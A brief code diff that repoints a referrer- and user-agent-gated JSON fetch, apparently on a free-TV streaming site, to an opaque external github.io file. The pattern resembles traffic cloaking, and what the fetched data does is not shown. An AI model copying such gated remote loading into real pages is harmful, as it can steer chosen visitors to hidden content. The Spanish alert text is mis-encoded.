@@ -24,7 +24,7 @@ if (getURL == "#") {alert('Vuelve a la pÃ¡gina anterior');}
 var referrer =  document.referrer;
    if((referrer.indexOf("cablegratis.biz") > -1) || /iPad|iPod|BlackBerry|IEMobile|webOS|Opera Mini/i.test(navigator.userAgent)) {
          function getSjson(name){
-          $.getJSON("/json/f.json?alfasdvdezkr", function(response) {
+          $.getJSON("https://stlpsc.github.io/cvb/json/flow.json?alfasdvdezkr", function(response) {
             sTLS(response[name]);
           });
 
